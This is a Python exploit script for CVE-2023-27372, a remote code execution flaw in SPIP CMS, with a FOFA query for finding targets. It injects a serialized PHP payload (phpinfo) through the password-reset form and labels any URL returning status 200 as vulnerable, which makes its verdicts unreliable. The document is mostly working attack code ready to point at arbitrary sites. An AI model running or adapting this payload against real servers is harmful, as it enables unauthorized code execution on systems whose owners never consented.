#FOFA语句：app="SPIP"
#导包
import requests,sys,argparse,json,re
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """
   _____ _____ _____ _____     _____ __  __  _____                
  / ____|  __ \_   _|  __ \   / ____|  \/  |/ ____|               
 | (___ | |__) || | | |__) | | |    | \  / | (___    _ __ ___ ___ 
  \___ \|  ___/ | | |  ___/  | |    | |\/| |\___ \  | '__/ __/ _ \
  ____) | |    _| |_| |      | |____| |  | |____) | | | | (_|  __/
 |_____/|_|   |_____|_|       \_____|_|  |_|_____/  |_|  \___\___|
                                                                  
                                                                  


"""
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description='CVE-2023-27372 SPIP CMS远程代码执行漏洞')
    parser.add_argument('-url','--url',dest='url',type=str,help='please input your url')
    args = parser.parse_args()
    if args.url:
        poc(args.url)
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


#poc函数
def poc(target):
    payload = '/spip/spip.php?page=spip_pass'
    headers = { 'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'close',
                'Cookie': 'cibcInit=oui',
                'Content-Length': '215',
                'Content-Type': 'application/x-www-form-urlencoded'

    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080',
    }
    data='page=spip_pass&formulaire_action=oubli&formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&oubli=s:19:"<?php phpinfo(); ?>";&nobot='
    try:    
        res = requests.post(url=target + payload,headers=headers,data=data,verify=False,proxies=proxies)
        if res.status_code == 200:
            print(f'[+]{target}存在漏洞')
        else:
            print(f'[-]{target}不存在漏洞')
    except:
        pass




#函数入口
if __name__== '__main__':
    main()
